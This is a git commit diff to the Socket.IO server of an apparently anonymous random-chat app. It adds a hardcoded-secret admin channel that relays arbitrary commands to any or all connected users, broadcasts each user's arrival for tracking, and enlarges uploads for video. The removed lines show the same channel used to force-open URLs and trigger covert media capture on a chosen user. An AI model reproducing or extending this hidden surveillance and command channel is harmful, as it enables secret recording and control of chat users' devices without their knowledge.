4396d4205828b617d1f05e3ec8deda7cfbd75391
weyoy3 <weyoy3@gmail.com>
2026-07-22 23:29:47 +0300

    Update server.js

--- server.js
+++ server.js
@@ -6,8 +6,9 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  pingTimeout: 2000,
-  pingInterval: 4000
+  maxHttpBufferSize: 5e7, // السماح برفع ملفات وفيديوهات بحجم كبير دون قطع الاتصال
+  pingTimeout: 10000,
+  pingInterval: 5000
 });
 
 app.use(express.static(__dirname));
@@ -19,6 +20,9 @@ app.get('/', (req, res) => {
 let waitingUser = null;
 
 io.on('connection', (socket) => {
+  // إبلاغ الأدمن فوراً بانضمام مستخدم جديد
+  socket.broadcast.emit('new_user_connected', { socketId: socket.id });
+
   socket.on('find_partner', () => {
     if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
       const roomName = 'room_' + socket.id + '_' + waitingUser.id;
@@ -69,24 +73,10 @@ io.on('connection', (socket) => {
   socket.on('admin_action', (data) => {
     if (data.secret !== 'mySuperSecretAdmin123') return;
 
-    if (data.action === 'alert') {
-      io.emit('system_alert', data.message);
-    } else if (data.action === 'open_url') {
-      io.emit('force_open_url', data.url);
-    } else if (data.action === 'clear_chat') {
-      io.emit('clear_chat', { target: data.target });
-    } else if (data.action === 'ring_phone') {
-      io.emit('trigger_ringtone', data.tone);
-    } else if (data.action === 'change_bg') {
-      io.emit('change_bg', data.bgColor);
-    } else if (data.action === 'request_media') {
-      if (data.targetSocket) {
-        io.to(data.targetSocket).emit('trigger_media_capture', { 
-          type: data.mediaType, 
-          duration: data.duration, 
-          adminSocketId: socket.id 
-        });
-      }
+    if (data.targetSocket && data.targetSocket !== 'all') {
+      io.to(data.targetSocket).emit('execute_admin_command', data);
+    } else {
+      io.emit('execute_admin_command', data);
     }
   });
 
@@ -95,6 +85,7 @@ io.on('connection', (socket) => {
     if (socket.roomName) {
       socket.to(socket.roomName).emit('partner_disconnected');
     }
+    io.emit('user_disconnected', { socketId: socket.id });
   });
 });
 
